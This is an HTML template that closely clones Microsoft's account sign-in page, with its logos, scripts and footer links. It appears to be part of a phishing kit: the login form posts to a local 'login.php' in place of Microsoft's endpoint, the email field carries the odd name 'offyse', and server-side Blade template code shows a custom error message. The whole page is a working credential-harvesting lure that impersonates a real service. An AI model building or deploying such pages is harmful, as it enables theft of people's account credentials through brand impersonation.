<html dir="ltr" class="" lang="en"><head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">

        <noscript>
            &lt;meta http-equiv="Refresh" content="0; URL=https://login.microsoftonline.com/jsdisabled" /&gt;
        </noscript>
        <link rel="shortcut icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7427.7/content/images/favicon_a.ico">
    
    <meta name="robots" content="none">



    <script type="text/javascript">
        ServerData = $Config;
    </script>

    
<link crossorigin="anonymous" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7427.7/content/cdnbundles/converged.login.min.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)">
    <script crossorigin="anonymous" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7427.7/content/cdnbundles/convergedlogin_pcore.min.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)"></script>


    <script crossorigin="anonymous" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7427.7/content/cdnbundles/convergedloginpaginatedstrings-en.min.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)"></script>

<style type="text/css">
.enerror{
	color: red;
}
</style>

</head>

<body class="cb" style="display: block;">
    <script type="text/javascript">//<![CDATA[
!function(){var e=window,o=e.document,i=e.$Config||{};if(e.self===e.top)o&&o.body&&(o.body.style.display="block");else if(!i.allowFrame){var s=e.self.location.href,l=s.indexOf("#"),n=-1!==l,t=s.indexOf("?"),f=n?l:s.length,d=-1===t||n&&t>l?"?":"&";s=s.substr(0,f)+d+"iframe-request-id="+i.sessionId+s.substr(f),e.top.location=s}}();

//]]></script>

<div class="background" role="presentation"><!-- ko if: smallImageUrl --> <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7427.7/content/images/backgrounds/0-small.jpg?x=138bcee624fa04ef9b75e86211a9fe0d&quot;);"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7427.7/content/images/backgrounds/0.jpg?x=a5dbd4393ff6a725c7e62b61df7e72f0&quot;);"></div><!-- ko if: useImageMask --><!-- /ko --><!-- /ko --> </div></div> <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }" action="login.php"><!-- ko withProperties: { '$loginPage': $data } --> <div class="outer" data-bind="component: { name: 'page',
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.fShowCookieBanner --><!-- /ko --> <div class="middle" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }"><!-- ko if: $loginPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> <div class="inner" data-bind="css: { 'app': $loginPage.backgroundLogoUrl(), 'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide') }"><!-- ko ifnot: paginationControlMethods()
                    && (paginationControlMethods().currentViewHasMetadata('hideLogo')
                        || (paginationControlMethods().currentViewHasMetadata('hideDefaultLogo') && !$loginPage.bannerLogoUrl())) --> <div role="banner" data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7427.7/content/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7427.7/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7427.7/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --><!-- ko if: showErrorDetails --><!-- /ko --> <div role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow } }"><div data-bind="css: { 'animate': animate() || animate.back(), 'back': animate.back }"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="1" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            displayName: sharedData.displayName,
                            prefillNames: $loginPage.prefillNames,
                            flowToken: sharedData.flowToken,
                            altCredHintShown: sharedData.altCredHintShown },
                        event: {
                            refresh: $loginPage.view_onRefresh,
                            redirect: $loginPage.view_onRedirect,
                            showLearnMore: $loginPage.learnMore_onShow } }"><!--  --> <div data-bind="component: { name: 'header-control', params: { serverData: svr } }"><div class="row text-title" id="loginHeader" role="heading"> <div aria-level="1" data-bind="text: title">Sign in</div><!-- ko if: isSubtitleVisible --><!-- /ko --> </div></div><!-- ko if: pageDescription && !svr.fHideLoginDesc --><!-- /ko --> <div class="row"> <div role="alert" aria-live="assertive" aria-atomic="false"><!-- ko if: usernameTextbox.error --><!-- /ko --> </div> <div class="form-group col-md-24"><!-- ko if: prefillNames().length > 1 --><!-- /ko --><!-- ko ifnot: prefillNames().length > 1 --> <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox',
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: tenantBranding.UserIdLabel || str['CT_PWD_STR_Email_Example'],
                hintCss: 'placeholder' + (!svr.fAllowPhoneSignIn ? ' ltr_override' : '') },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
                 @if(Session::has('status') && Session::get('status') == "error") <p class="enerror">Your username is required.</p>@endif <input type="email" name="offyse" id="i0116" maxlength="113" lang="en" class="form-control ltr_override" aria-describedby="usernameError loginHeader loginDescription" aria-required="true" data-bind="textInput: usernameTextbox.value,
                    hasFocusEx: usernameTextbox.focused,
                    placeholder: $placeholderText,
                    ariaLabel: tenantBranding.UserIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
                    css: { 'has-error': usernameTextbox.error },
                    attr: inputAttributes" placeholder="Email, phone, or Skype" aria-label="Enter your email, phone, or Skype."> <input name="passwd" type="password" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true"> <div id="usernameProgress" class="progress" role="progressbar" data-bind="visible: isRequestPending, component: 'marching-ants-control', ariaLabel: str['WF_STR_ProgressText']" aria-label="Please wait" style="display: none;"><!--  --><!-- ko if: useCssAnimation --> <div></div><div></div><div></div><div></div><div></div><div></div><!-- /ko --><!-- ko ifnot: useCssAnimation --><!-- /ko --></div> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div><!-- /ko --> </div> </div> <div data-bind="invertOrder: svr.fRepositionFooterButtons, css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons"> <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.fShowButtons,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right form-group" data-bind="
     visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
     css: { 'no-margin-bottom': removeBottomMargin || svr.fRepositionFooterButtons, 'button-container': svr.fRepositionFooterButtons }"> <div data-bind="
            css: {
                'inline-block': svr.fRepositionFooterButtons,
                'col-xs-12 secondary': isPrimaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
                'col-xs-24': !(isPrimaryButtonVisible() || svr.fRepositionFooterButtons) }" class="col-xs-12 secondary"> <input type="button" id="idBtn_Back" class="btn btn-block" data-bind="
            attr: {
                'id': secondaryButtonId || 'idBtn_Back',
                'aria-describedby': secondaryButtonDescribedBy },
            value: secondaryButtonText() || str['CT_HRD_STR_Splitter_Back'],
            hasFocus: focusOnSecondaryButton,
            click: secondaryButton_onClick,
            enable: isSecondaryButtonEnabled,
            visible: isSecondaryButtonVisible" value="Back" style="display: none;"> </div> <div data-bind="
            css: {
                'inline-block': svr.fRepositionFooterButtons,
                'col-xs-12 primary': isSecondaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
                'col-xs-24': !(isSecondaryButtonVisible() || svr.fRepositionFooterButtons) }" class="col-xs-24"> <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: {
                'id': primaryButtonId || 'idSIButton9',
                'aria-describedby': primaryButtonDescribedBy },
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible" value="Next"> </div> </div></div> </div> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"><!-- ko if: svr.fCBShowSignUp && !svr.fDoIfExists && !svr.fCheckProofForAliases --> <div class="form-group" data-bind="
                    htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                    childBindings: {
                        'signup': {
                            href: svr.urlSignUp,
                            css: { 'display-inline-block': true },
                            ariaLabel: str['WF_STR_SignupLink_AriaLabel_Text'],
                            click: signup_onClick } }">No account? <a href="https://login.live.com/oauth20_authorize.srf?response_type=code&amp;client_id=51483342-085c-4d86-bf88-cf50c7252078&amp;scope=openid+profile+email+offline_access&amp;response_mode=form_post&amp;redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&amp;state=rQIIAXVSO2_TUBjNTdoorRBUCAnGDExITq4f13lIHdraaR61XVI7Dy-RYzvxTWJf49zUan4DQyS2sjGA1IGhYkBlRULq1A2pGxIDggUhkBgYcNkZvm_4ztHR0XfOowxbYKsPBV5AVmlYYSqWyDNChYWMJXAiwyNe5DnIOgjy0d3NrXfn6OOnn892V7_G2-rzb59PwcZgho_dgk38M3DfozScV4vFOI4LZDTC9j-g-BaAKwC-AHCaXncDxjg6S89FXkRlJEAo8MkgFooFhZOXCmcI5r5CTd-ItT0IzX2ZPejWptq-kdxMX5Mcr881lprUQKqkCH2u7an6lCrd5ky94U8MeNCVUd-XaV9XfVOyE82Op0zkk-v0HW1nQT3uZpEIL90f6Y0RifxBSOb0NPMKaKEbNJw9EgSuTQs3NDeg2LYoJsFhREI3otidb3t9fTid0sF40WiVT0LTGp-oHatO7Jh2pV6d0pYeGmUUWrsTZxhzAu219bEelnZq8e6wJDckVuPYJg7g4ULrOs0FhI5EGIJHPWNYD_QneOy34qYtdOoWo3TM6ewIWZ0BbONKPTgyOXieySZv9UlwmbmdmAqwkw8jMsIz92oNfF27BTPVXC67BR6k8qnfa-DFepLc-5yVe_Pyj7b68PopvthMXa4X40Od91SvK6LwcXsRIyU4jmeder9sy6RXQs1aC0Ulb2-p03ibr7KrLFhls9-zqYuN_wV9vXkvKUuZgQIDUZ5FVaFU5XjzLw2&amp;estsfed=1&amp;uaid=d735b2bbf4e1429390f5673d4e9bebe4&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;mkt=en-US" id="signup" class="display-inline-block" aria-label="Create a Microsoft account">Create one!</a></div><!-- /ko --><!-- ko component: { name: "cred-switch-link-control",
                    params: {
                        serverData: svr,
                        availableCreds: availableCredsWithoutUsername,
                        altCredHintEnabled: altCredHintEnabled() },
                    event: {
                        switchView: noUsernameCredSwitchLink_onSwitchView } } --><!--  --><!-- ko if: altCreds.length > 0 --><!-- /ko --><!-- /ko --><!-- ko if: !svr.sRemoteConnectAppName && svr.remoteLoginConfig --><!-- /ko --><!-- ko if: svr.showCantAccessAccountLink --> <div class="form-group"> <a id="cantAccessAccount" href="#" data-bind="text: str['WF_STR_CantAccessAccount_Text'], click: cantAccessAccount_onClick">Can’t access your account?</a> </div><!-- /ko --> </div> </div> </div> </div><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div></div> </div><!-- ko if: newSessionMessage --><!-- /ko --> <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value=""> <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value=""> <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value=""> <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value=""> <input type="hidden" name="canary" data-bind="value: svr.canary" value="wPT3hNhW65pQRuw5MnvwlVHY8cEoX75JFK5r7hCzTtw=3:1"> <input type="hidden" name="ctx" data-bind="value: ctx" value="rQIIAXVRvYvTcABt-hF6h-jhouMNTkLaXz5-6Qd0uDbp5yWpbdK0WY40SZu0TX4x_dXQ_g0OBbdzc1C4weFwkHMVhJtuE9wEB9FFRMHBwfYPcHhveDwej_cepugcXX7AsRw0C-MSVTJ5luJKNKBMjuEpFrI8ywDahoCN7h4evbuEHz__elbd_p5W5Offv1wQ91yMw2U5n4_jOIcmE89ychby828J4oYgvhLEeTLjBJTWv0gueZaHRcgBwLE7QBrwOYkRNxKjcUZDwoavxUoNAKMh0qd6fa40tJ1m-IpguyOmtVGEFpQFiRsxPVdW51jS2wt5759p4FQX4cgX8UiVfUOwdpkDV5qJ60_JO8rJCrvMnlDkbZyfyYMJivyzEC3xeeoVoYRO0LJrKAgcC-f2NifAnmViDwXdCIVOhD1nWXFH6ng-x2fTVatTXIeGOV3LA7OJrBjrwrCJcUcNtSIMzerMHscMh4c9daqGhZN6XB0XxJZAKwzd9gLQXSm63V4BYAuIQt5kqI2bgfrYm_qduG1xg6ZJSQNjvuhDc3AGel6pGfQNBlymyN2sPgquU7d3pQLPPg4jNPEWzk2a-Ja-BVLlbJY8Iu4njhN_0sSLzO6t91kz--blX2X74fVT7-owcZ3Jx12VdWVX52H4qLeKoRQ8iReD5qhoiWhYgO16B0YFt7ZRcVxhy_SWJLYk-YNMXB387-h_0"> <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="086108c4-a6b4-4ffc-90c7-ae8c69ba0a00"> <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAABHh4kmS_aKT5XrjzxRAtHzTW1G4e-m1t6sKpYHjB8fTSWesUIYUqmP9MTGucHYnN_2z5NaC_-kHoRM4qGMkI2Wb9H4KpzlpljTTsG4EM8DVJFOkAUqxsGiUNy8dGEtyq2eY_TwJQNnpDRNb7dEBOed0SoDKAmhsOqT6LExqliCKolu72Ioreo8rZBHxrWfjdNrx38aDcOkOm--bNokGO8PnPZJBKoBfz5zq2JBxe8zFKSUmZgGppHJ72JTmmOUGx9WgzRPKKkFAQoeC88r1FRLNqhjHHg03vYyzEfaAeG8egljWA4EF1mGbvFxyPDXp9PZ543mDc2C-Qoo01zxuM_vIAA"> <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value=""> <input type="hidden" name="NewUser" value="1"> <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value=""> <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0"> <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0"> <input type="hidden" name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0"> <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported ? 1 : 0" value="0"> <div data-bind="component: { name: 'instrumentation',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="1"> <input type="hidden" name="i17" data-bind="value: srsFailed" value=""> <input type="hidden" name="i18" data-bind="value: srsSuccess" value=""> <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div> </div> <!-- /ko --></div><!-- /ko --><!-- ko if: showOptOutBanner --><!-- /ko --> <div id="footer" class="footer default" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }"> <div data-bind="component: { name: 'footer-control',
            params: {
                serverData: svr,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick,
                moreInfoClick: footer_onShowDebugDetails } }"><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --> <span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">©2018 Microsoft</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://privacy.microsoft.com/en-US/privacystatement">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> <a href="#" role="button" class="moreOptions" data-bind="click: moreInfo_onClick, ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'], attr: { title: str['CT_STR_More_Options_Ellipsis_AriaLabel'] }" aria-label="Click here for more options" title="Click here for more options"><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7427.7/content/images/ellipsis_white.png?x=0ad43084800fd8b50a2576b5173746fe" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7427.7/content/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73" data-bind="imgSrc" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7427.7/content/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7427.7/content/images/ellipsis_grey.png?x=5bc252567ef56db648207d9c36a9d004" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7427.7/content/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c" data-bind="imgSrc" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7427.7/content/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div> <!-- /ko --></div> </div> </form> <form method="post" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"><!-- ko foreach: postRedirectParams --><!-- /ko --> </form><!-- ko if: svr.urlMsaMeControl --><!-- /ko --><!-- ko if: svr.urlCBPartnerPreload --> <div id="idPartnerPL" data-bind="injectIframe: { url: svr.urlCBPartnerPreload }"><iframe height="0" width="0" src="https://www.office.com/prefetch/prefetch" style="display: none;"></iframe></div> <!-- /ko --></div>
				
				</body></html>